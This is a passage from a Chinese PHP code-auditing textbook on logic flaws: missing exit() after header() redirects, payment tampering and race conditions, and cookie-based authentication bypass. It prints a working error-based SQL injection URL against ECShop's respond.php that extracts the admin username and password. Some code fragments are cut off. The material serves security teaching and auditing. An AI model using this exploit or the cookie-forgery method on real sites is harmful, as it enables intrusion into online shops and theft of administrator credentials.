php
if
（
$_GET['var']==='aa'
）
{
      //
程序已经安装，跳转到首页
      header
（
"Location
：
../"
）；
}
echo $_GET['var']
；
当我们用浏览器访问的时候是看不到输出的$_GET参数的，因为浏览器接受到跳转指令后会立马跳转，我们用burp来抓返回的数据如图6-9所示。
图 6-9
可以看到输出了“aa”，说明经过header（）函数之后程序依然继续执行了，正确的写法应该是在header（）函数之后加一个exit（）或者die（）。
6.2.1.4 常见支付漏洞
曾经有不少体量不小的电子商务网站都出现过支付漏洞，最终导致的结果是不花钱或者花很少的钱买更多的东西，还真的有不少人测试漏洞之后真的收到了东西，这种天上掉馅饼的漏洞太有诱惑力了。最常见的支付漏洞有四种，下面我们来看看这四种情况在代码审计的时候应该怎么挖。
第一、二、三种比较简单，分别是客户端可修改单价、总价和购买数量，服务器端未校验严格导致，比如在支付的时候一般购物车都如图6-10所示。
图 6-10
从图中我们可以看到三个关键元素，单价、总价和数量，这三个数字不管是哪个被改变，都会影响最终成交价格，部分商城程序是直接由单价和数量计算总价，但是并没有验证这两个数字是否小于0，在上图的例子中，驾驶服务器没有验证数量这个数字，我们可以在客户端把数字改成负数然后提交上去，这类的case很多，具体的可以到乌云（wooyun.org）查看，这种形式的支付漏洞，只要我们找到支付功能代码，看看代码过滤情况即可挖掘到。
还有一种是以重复发包来利用时间差，以少量的钱多次购买，说到大家以前听过比较多的就是手机刷QQ钻了，也是利用同样的原理，利用手机快速给腾讯发送一条开通QQ业务的短信，发送完之后再快速发送一条取消业务的短信到短信运营商，真正的漏洞出现在短信运营商那边而不是腾讯。很多IDC开通VPS等业务的系统也存在这种漏洞，大概的原理如图6-11所示。
我们从图中可以看到一开始程序判断余额足够，然后两个订单都进入到服务开通流程，但是并还没有扣费，我们就是利用这个服务开通流程所花费的时间来多次开通业务。
我们在做代码审计挖掘这类漏洞的时候，可以注意寻找下面这种形式的代码：
图 6-11
 $data
）
        {
             $_GET[$key] = $data
；
        }
    }
    $payment  = get_payment
（
$_GET['code']
）；
    $seller_email = rawurldecode
（
$_GET['seller_email']
）；
    $order_sn = str_replace
（
$_GET['subject']
，
''
，
$_GET['out_trade_no']
）；
    $order_sn = trim
（
$order_sn
）；
    /*
检查支付的金额是否相符
*/
    if
（！
check_money
（
$order_sn
，
$_GET['total_fee']
））
    {
/*----
省略
----*/
$order_sn变量由str_replace（$_GET['subject']，''，$_GET['out_trade_no']）；控制，我们可以通过$_GET['subject']参数来替换掉$_GET['out_trade_no']参数里面的反斜杠\。
最终$order_sn被带入check_money（）函数。我们跟进看一下在include\lib_payment.php文件中109行，代码如下：
function check_money
（
$log_id
，
$money
）
{
    $sql = 'SELECT order_amount FROM ' . $GLOBALS['ecs']->table
（
'pay_log'
）
.
           " WHERE log_id = '$log_id'"
；
    $amount = $GLOBALS['db']->getOne
（
$sql
）；
    if
（
$money == $amount
）
    {
    /*----
省略
----*/
此处就是漏洞现场。原来的$order_sn被带入了数据库导致注入漏洞存在，这个漏洞的逻辑问题就在于本来一个已经过滤掉特殊字符的参数，又再次被用户自定义提交上来的参数替换，导致原来的过滤符合反斜杠被替换掉，程序员在写代码的时候没有考虑到这块的逻辑问题。
利用实践：首先我们要通过str_replace来达到我们想要的效果，%00是截断符，即也为NULL，NULL值是与0相等的，测试代码如下：
'
）；
print_r
（
$b.''
）；
print_r
（
str_replace
（
$a
，
''
，
$b
））；？
>
效果图如图6-12所示。
图 6-12
最终漏洞的利用效果如下：
EXP
：
http
：
//localhost/ecshop/respond.php
？
code=alipay&subject=0&out_trade_no=%00
′
and
（
select * from
（
select count
（
*
），
concat
（
floor
（
rand
（
0
）
*2
），（
select concat
（
user_name
，
password
）
from ecs_admin_user limit 1
））
a from information_schema.tables group by a
）
xxx
）
-- 1
结果如图6-13所示。
图 6-13
6.2.2 漏洞防范
通过分析我们之前列举的几种逻辑漏洞，可以看到所有的逻辑漏洞都是因为开发者对业务逻辑或者代码逻辑理解不清楚导致。每一种业务功能都有可能导致逻辑漏洞的产生，而业务功能里面的实现逻辑是人思考出来的，所以要解决这类逻辑问题需要注意以下两点：
·要深入熟悉业务逻辑，只有我们熟悉了业务的逻辑，才能根据业务需要编写满足需求而又不画蛇添足的代码。
·要注意多熟悉函数的功能和差异，因为很多写代码写得很熟悉的人出现bug通常不是因为多一个字母或者少一个分号，而是代码执行逻辑上面考虑不周全导致。
6.3 会话认证漏洞
会话认证是一个非常大的话题，涉及各种认证协议和框架，如cookie、session、sso、oauth、openid等，出现问题比较多的在cookie上面，cookie是Web服务器返回给客户端的一段常用来标识用户身份或者认证情况的字符串，保存在客户端，浏览器下次请求时会自动带上这个标识，由于这个标识字符串可以被用户修改，所以存在安全风险，一般这块的认证安全问题都出在服务端直接取用cookie的数据而没有校验，其次是cookie加密数据存在可预测的情况。另外是session是保存在服务器端的信息，如果没有代码操作，客户端不能直接修改session，相对比较安全。
sso、oauth、openid与cookie、session相比不是一个维度的东西，由于这块在应用代码审计没有什么合适的案例，暂时先不介绍。
6.3.1 挖掘经验
认证漏洞在代码审计的时候能遇到比较多的是出现在cookie验证上面，通常是没有使用session来认证，而是直接将用户信息保存在cookie中，程序使用的时候直接调用。一般这个过程都有一个统一的函数去取数据调用，容易导致SQL注入和越权等漏洞。在挖掘登录认证漏洞的时候，可以先看一下程序的登录功能代码，看看整个登录过程的业务逻辑有没有可以控制session值或者直接绕过密码验证的漏洞；另外需要关注程序验证是否为登录的代码，通俗的说是验证cookie的代码，是不是直接去取cookie里面的值，然后怎么去判断这个值来验证是否登录。以前见过相当粗糙的验证是直接判断cookie里面的username参数是否为空，还有就是以cookie里面的用户名来作为当前用户，这种情况直接把用户名改成admin等管理员用户名就直接是管理员权限了。
6.3.1.1 cookie认证安全
cookie可以保存任何字符串，各个浏览器保存cookie字节数大小不一样，一般都不超过4096个字节，通常cookie用来保存登录账号的标识信息，比如用户名或者sessionid等，浏览器每次请求的时候都会再次带上对应这个域名的cookie信息，服务器应用程序可以对cookie进行读取修改或者删除等任意操作。
cookie出现问题比较多的是cookie的SQL注入等常见漏洞，以及Web应用程序在服务端直接读取cookie的用户名或者ID值来操作当前这个用户的数据，这里存在很大的一个问题是cookie可以伪造，从而就导致了伪造用户身份登录的漏洞。
通常一个cookie验证的代码大概如下：
CON['mem_isucenter']
）
{
      include_once admin_ROOT . 'public/uc_client/client.php'
；
      }
      parent
：：
start_pagetemplate
（）；
      parent
：：
member_purview
（）；
      $lng =
（
admin_LNG == 'big5'
）
？
$this->CON['is_lancode']
：
admin_LNG
；
      $db_where = "userid=$this->ec_member_username_id AND username='$this-> ec_member_username' "
；
      $db_table1 = db_prefix . 'member AS a'
；
      $db_table2 = db_prefix . 'member_value AS b'
；
      $db_sql = "SELECT * FROM $db_table1 LEFT JOIN $db_table2 ON a.userid = b.userid  WHERE a.userid = $this->ec_member_username_id "
；
      $rsMember = $this->db->fetch_first
（
$db_sql
）；
      $rsMember['rankname'] = $this->get_member_purview
（
$rsMember['mcid']
，
'rankname'
）；
      $userid = $this->ec_member_username_id
；
  //
获取
userid
      if
（
empty
（
$userid
））
{
         exit
（
'user err
！
'
）；
      }
      $db_table = db_prefix . "order"
；
      $db_where = " WHERE userid=$userid"
；
在代码中$userid=$this->ec_member_username_id；这行代码设置当前用户ID，随后根据这个$userid变量去直接操作这个id的用户数据，而这个$this->ec_member_username_id变量的值又是从哪来的呢？注意代码最开始的地方有调用parent：：member_purview（）函数，我们跟过去看看，在/public/class_connector.php文件的member_purview（）函数，代码如下：
function member_purview
（
$userrank = false
，
$url = null
，
$upurl = false
）
{
      $this->ec_member_username = $this->fun->eccode
（
$this->fun-> accept
（
'ecisp_member_username'
，
'C'
），
'DECODE'